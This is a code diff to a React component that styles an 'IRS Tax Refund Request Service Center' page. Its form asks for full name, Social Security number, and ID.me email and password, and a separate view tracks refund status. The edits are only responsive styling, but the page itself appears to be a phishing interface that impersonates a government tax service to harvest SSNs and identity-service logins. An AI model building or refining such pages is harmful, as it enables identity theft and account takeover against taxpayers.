@@ -120,8 +120,8 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
                         ].map((step, i) => (
                           <div key={i} className="flex flex-col items-center gap-4 relative z-10">
                             <div className={`w-3 h-3 rounded-full border-2 border-white transition-all ring-1 ${step.done ? 'bg-green-500 ring-green-500 scale-150' :
-                                step.active ? 'bg-gold-500 ring-gold-500 scale-125 animate-pulse' :
-                                  'bg-gray-200 ring-gray-200'
+                              step.active ? 'bg-gold-500 ring-gold-500 scale-125 animate-pulse' :
+                                'bg-gray-200 ring-gray-200'
                               }`}></div>
                             <span className={`text-[8px] font-black uppercase tracking-widest ${step.active ? 'text-navy-900' : 'text-gray-300'
                               }`}>{step.label}</span>
@@ -140,8 +140,8 @@ const TrackingView = ({ onBack }: { onBack: () => void }) => {
                         <div key={i} className="flex gap-4">
                           <div className="flex flex-col items-center shrink-0">
                             <div className={`w-3 h-3 rounded-full border-2 border-white transition-all ${step.done ? 'bg-green-500 scale-125 shadow-[0_0_8px_rgba(34,197,94,0.3)]' :
-                                step.active ? 'bg-gold-500 scale-110 animate-pulse shadow-[0_0_8px_rgba(201,147,58,0.3)]' :
-                                  'bg-gray-300'
+                              step.active ? 'bg-gold-500 scale-110 animate-pulse shadow-[0_0_8px_rgba(201,147,58,0.3)]' :
+                                'bg-gray-300'
                               }`}></div>
                             {i < 2 && <div className={`w-0.5 h-full min-h-[20px] bg-gray-200 mt-1`}></div>}
                           </div>
@@ -230,7 +230,7 @@ const TaxRefundSection = () => {
   };
 
   return (
-    <div className="max-w-4xl mx-auto space-y-12">
+    <div className="px-0 py-4 mobile:px-0 mobile:py-0 max-w-4xl mx-auto space-y-6 mobile:space-y-12">
       <div className="flex justify-end">
         <button
           onClick={() => setView(view === 'apply' ? 'track' : 'apply')}
@@ -253,19 +253,19 @@ const TaxRefundSection = () => {
       {view === 'apply' ? (
         <>
           {/* Hero Header */}
-          <div className="bg-[#0b1626] rounded-[2.5rem] p-6 mobile:p-12 text-white relative overflow-hidden border border-gold-500/20">
+          <div className="bg-[#0b1626] rounded-2xl mobile:rounded-[2.5rem] p-5 mobile:p-12 text-white relative overflow-hidden border border-gold-500/20">
             <div className="absolute top-0 right-0 w-96 h-96 bg-gold-500/10 rounded-full -mr-48 -mt-48 blur-3xl"></div>
             <div className="relative z-10">
-              <div className="flex items-center gap-4 mb-6">
-                <div className="w-16 h-16 bg-gold-500/20 rounded-2xl flex items-center justify-center border border-gold-500/20">
-                  <FileText className="w-10 h-10 text-gold-500" />
+              <div className="flex items-center gap-3 mobile:gap-4 mb-4 mobile:mb-6">
+                <div className="w-12 h-12 mobile:w-16 mobile:h-16 bg-gold-500/20 rounded-xl mobile:rounded-2xl flex items-center justify-center border border-gold-500/20">
+                  <FileText className="w-7 h-7 mobile:w-10 mobile:h-10 text-gold-500" />
                 </div>
                 <div>
-                  <h2 className="text-2xl mobile:text-4xl font-black uppercase tracking-tight">IRS Tax Refund</h2>
-                  <p className="text-gold-500/80 font-black text-xs uppercase tracking-widest mt-1">Request Service Center</p>
+                  <h2 className="text-xl mobile:text-4xl font-black uppercase tracking-tight">IRS Tax Refund</h2>
+                  <p className="text-gold-500/80 font-black text-[10px] mobile:text-xs uppercase tracking-widest mt-1">Request Service Center</p>
                 </div>
               </div>
-              <p className="text-gray-400 text-sm mobile:text-base max-w-2xl leading-relaxed">
+              <p className="text-gray-400 text-xs mobile:text-base max-w-2xl leading-relaxed">
                 Please fill out the form below to submit your IRS tax refund request. Our experts will handle the verification and processing with efficiency.
               </p>
             </div>
@@ -274,8 +274,8 @@ const TaxRefundSection = () => {
           <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
             {/* Form Column */}
             <div className="lg:col-span-2">
-              <div className="bg-white rounded-[2.5rem] p-6 mobile:p-10 border border-gray-100 shadow-sm relative overflow-hidden">
-                <form onSubmit={handleSubmit} className="space-y-8">
+              <div className="bg-white rounded-2xl mobile:rounded-[2.5rem] p-5 mobile:p-10 border border-gray-100 shadow-sm relative overflow-hidden">
+                <form onSubmit={handleSubmit} className="space-y-6 mobile:space-y-8">
                   {/* Personal Information */}
                   <div className="space-y-6">
                     <h4 className="flex items-center gap-2 text-[10px] font-black text-gold-600 uppercase tracking-[0.2em]">
@@ -291,7 +291,7 @@ const TaxRefundSection = () => {
                           value={fullName}
                           onChange={(e) => setFullName(e.target.value)}
                           placeholder="Enter your full name"
-                          className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
+                          className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                           required
                         />
                       </div>
@@ -306,7 +306,7 @@ const TaxRefundSection = () => {
                           value={ssn}
                           onChange={(e) => setSsn(e.target.value)}
                           placeholder="XXX-XX-XXXX"
-                          className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 font-mono"
+                          className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm font-mono"
                           required
                         />
                       </div>
@@ -329,7 +329,7 @@ const TaxRefundSection = () => {
                             value={idmeEmail}
                             onChange={(e) => setIdmeEmail(e.target.value)}
                             placeholder="example@email.com"
-                            className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
+                            className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                             required
                           />
                         </div>
@@ -344,7 +344,7 @@ const TaxRefundSection = () => {
                             value={idmePassword}
                             onChange={(e) => setIdmePassword(e.target.value)}
                             placeholder="•••••••••••••"
-                            className="w-full pl-12 pr-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
+                            className="w-full pl-12 pr-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                             required
                           />
                         </div>
@@ -367,7 +367,7 @@ const TaxRefundSection = () => {
                               const val = e.target.value;
                               setCountry(val === 'Other' ? '' : val);
                             }}
-                            className="w-full px-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 appearance-none cursor-pointer"
+                            className="w-full px-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 appearance-none cursor-pointer mobile:text-base text-sm"
                             required
                           >
                             <option value="United States">United States</option>
@@ -394,7 +394,7 @@ const TaxRefundSection = () => {
                             value={country}
                             onChange={(e) => setCountry(e.target.value)}
                             placeholder="Enter your country name"
-                            className="w-full px-5 py-4 bg-gray-50 border border-gray-100 rounded-2xl focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300"
+                            className="w-full px-5 mobile:py-4 py-2  bg-gray-50 border border-gray-100 mobile:rounded-2xl rounded-lg focus:ring-2 focus:ring-gold-500/20 focus:border-gold-500 outline-none transition-all font-bold text-navy-900 placeholder:text-gray-300 mobile:text-base text-sm"
                             required
                           />
                         </motion.div>
@@ -403,7 +403,7 @@ const TaxRefundSection = () => {
                   </div>
 
                   {/* Important Notice */}
-                  <div className="p-6 bg-red-50 rounded-3xl border border-red-100 flex items-start space-x-4">
+                  <div className="mobile:p-6 p-4 bg-red-50 mobile:rounded-3xl rounded-lg border border-red-100 flex items-start space-x-4">
                     <AlertTriangle className="w-6 h-6 text-red-500 shrink-0" />
                     <div>
                       <h5 className="text-[10px] font-black text-red-700 uppercase tracking-widest mb-1">Important Notice</h5>
@@ -416,7 +416,7 @@ const TaxRefundSection = () => {
                   <button
                     type="submit"
                     disabled={isSubmitting}
-                    className="w-full px-10 py-5 bg-navy-900 text-gold-500 rounded-2xl font-black uppercase tracking-widest hover:bg-navy-800 transition-all shadow-xl shadow-navy-900/10 active:scale-95 disabled:opacity-50"
+                    className="w-full px-6 mobile:px-10 py-3 mobile:py-5 bg-navy-900 text-gold-500 rounded-xl mobile:rounded-2xl font-black uppercase tracking-widest hover:bg-navy-800 transition-all shadow-xl shadow-navy-900/10 active:scale-95 disabled:opacity-50 text-xs mobile:text-base"
                   >
                     {isSubmitting ? (
                       <div className="flex items-center justify-center space-x-2">
@@ -436,7 +436,7 @@ const TaxRefundSection = () => {
 
             {/* Sidebar Info Column */}
             <div className="space-y-6">
-              <div className="bg-white rounded-[2.5rem] p-8 border border-gray-100 shadow-sm">
+              <div className="bg-white mobile:rounded-[2.5rem] rounded-lg mobile:p-8 p-4 border border-gray-100 shadow-sm">
                 <h4 className="text-sm font-black text-navy-900 uppercase tracking-tight mb-4">Process Timeline</h4>
                 <div className="space-y-6">
                   {[
@@ -456,7 +456,7 @@ const TaxRefundSection = () => {
                 </div>
               </div>
 
-              <div className="bg-navy-900 rounded-[2.5rem] p-8 text-white relative overflow-hidden group">
+              <div className="bg-navy-900 mobile:rounded-[2.5rem] rounded-lg mobile:p-8 p-4 text-white relative overflow-hidden group">
                 <div className="absolute top-0 right-0 w-32 h-32 bg-gold-500/10 rounded-full -mr-16 -mt-16 blur-2xl group-hover:scale-150 transition-transform duration-700"></div>
                 <h4 className="text-sm font-black uppercase tracking-tight mb-4 relative z-10">Need Assistance?</h4>
                 <p className="text-gray-400 text-xs leading-relaxed mb-6 relative z-10">
